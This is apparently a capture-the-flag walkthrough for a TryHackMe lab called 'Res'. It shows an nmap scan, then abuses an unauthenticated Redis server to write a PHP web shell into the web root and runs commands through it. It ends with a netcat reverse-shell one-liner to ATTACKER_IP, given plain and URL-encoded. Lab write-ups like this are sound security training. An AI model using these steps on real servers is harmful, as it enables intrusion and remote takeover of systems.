---
sidebar_position: 1
description: Res
keywords: [res, tryhackme, ctf, pentesting, guide, docs, tutorial, enumeration, exploitation, nmap, redis exploit, privilege escalation, php exploitation redis]
---


# Enumeration

## NMAP

- <b style={{ color: 'LightSkyBlue' }}>[HTTP: 80]</b> <b style={{ color: 'Brown' }}>[Redis: 6379]</b>

```log
Nmap scan report for 10.10.150.201
Host is up (0.086s latency).

PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)
6379/tcp open  redis   Redis key-value store 6.0.7
```

## REDIS

`Redis` Server Requires no **Authentication.**

- We know the Default `Apache2` Site Folder: **`/var/www/html`** 
- Creating a `WebShell:`

```php
attacker@machine:~$ redis -h 10.10.150.201
10.10.150.201:6379> config set dir /var/www/html
OK
10.10.150.201:6379> config set dbfilename web_shell.php
OK
// highlight-next-line
10.10.150.201:6379> set test "<?php system($_GET['cmd']);?>"
OK
10.10.150.201:6379> save
OK
10.10.150.201:6379> exit
```

```php
+---------------+      +-------------------------------+
| web_shell.php |  >>  | <?php system($_GET['cmd']);?> |
+---------------+      +-------------------------------+
```

<br/>

- We can Access the `WebShell` at: <b style={{ color: 'SandyBrown' }}>[IP:80/web_shell.php]</b>

```bash
aubreanna@internal:~$ curl "http://10.10.150.201/web_shell.php?cmd=id"
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

```bash
# Command Execution
IP:web_shell.php?cmd=id

# PAYLOAD [URL ENCODED]
+---------------------------------------------------------------------------+      +-------------------------------------------------------------------------------------------------------------------------+
| rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc ATTACKER_IP 4444 >/tmp/f |  >>  | rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7Csh%20-i%202%3E%261%7Cnc%20ATTACKER_IP%204444%20%3E%2Ftmp%2Ff |
+---------------------------------------------------------------------------+      +-------------------------------------------------------------------------------------------------------------------------+
```